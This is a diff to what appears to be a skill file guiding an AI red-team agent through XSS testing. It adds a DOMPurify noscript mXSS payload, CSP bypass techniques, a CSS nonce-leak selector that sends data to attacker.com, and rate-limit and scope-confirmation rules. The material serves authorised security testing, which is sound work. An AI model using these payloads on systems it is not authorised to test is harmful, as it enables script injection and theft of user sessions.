@@ -29,6 +29,8 @@ injection testing to rt-injection. For session token theft impact
 assessment following confirmed XSS, coordinate with rt-auth-session.
 For CSP correctness auditing, delegate to rt-tls-headers.
 
+- Before sending WebSearch queries, generalise or redact project-specific identifiers (internal service names, proprietary terminology, exact code snippets). Use generic domain terms instead of project-internal names.
+
 ## Methodology
 
 ### 1. Reflection Point Discovery
@@ -96,6 +98,8 @@ If basic payloads are blocked, test bypass vectors:
   push it outside the inspection window. Test with both
   `application/x-www-form-urlencoded` and `multipart/form-data`.
 
+- **DOMPurify `<noscript>` mXSS:** If the target uses DOMPurify < 3.3.2 and inserts sanitised HTML via `innerHTML`, test: `<noscript><img src=x onerror=alert(1)></noscript>`. DOMPurify treats `<noscript>` content as text (not executable), but when the browser inserts via `innerHTML`, it re-parses the noscript content as live HTML, executing the img onerror. Also test template literal injection (CVE-2025-26791, DOMPurify < 3.2.4).
+
 ### 4. Stored XSS Testing
 
 Identify input that persists and is displayed to other users:
@@ -146,6 +150,14 @@ exploitation perspective. For CSP correctness auditing, see **rt-tls-headers**.
 - **`strict-dynamic`:** Trusted script can load additional scripts.
   If you control a trusted script's input, you control all scripts.
 - **Object/embed:** `object-src` missing allows Flash/Java-based XSS
+
+- **Import Maps:** If the CSP allows inline scripts (even with nonces), test injecting `<script type="importmap">` to override ES6 module resolution, redirecting imports to `data:` URIs.
+
+- **CSS Houdini Worklets:** Test `CSS.paintWorklet.addModule('data:text/javascript,...')` or `CSS.layoutWorklet.addModule()` - these load JS from data URIs and are not restricted by `script-src`.
+
+- **CSP Nonce Leakage via CSS:** If `style-src` allows unsafe-inline or if CSS injection is possible, test CSS attribute selectors (`script[nonce^="a"] { background: url('https://attacker.com/leak?n=a'); }`) to exfiltrate nonce values character-by-character. Once the nonce is known, it can be reused for script injection.
+
+- **Trusted Types:** If `require-trusted-types-for 'script'` is set, test creating permissive policies or manipulating the `default` policy to bypass the restriction.
 
 ### 7. Post-XSS Impact Assessment
 
@@ -233,3 +245,14 @@ erode trust more than missed findings.
   endpoints before concluding.
 - **Leave no trash behind.** Clean up any test accounts, uploaded files,
   or state changes created during testing. Document what was modified.
+
+## Resource Limits
+
+- Limit probing to 10 requests per endpoint per minute.
+- Set a per-target timeout of 30 seconds per request.
+- If a target returns 429 or 503, back off for 60 seconds before retrying.
+- Never send more than 500 requests in a single session.
+
+## Scope Enforcement
+
+Before beginning any probing, confirm the target scope with the user. If in doubt about whether a subdomain, IP, or service is owned by the target, ask before probing it. Never probe a CNAME target that resolves to a third-party SaaS without explicit permission.
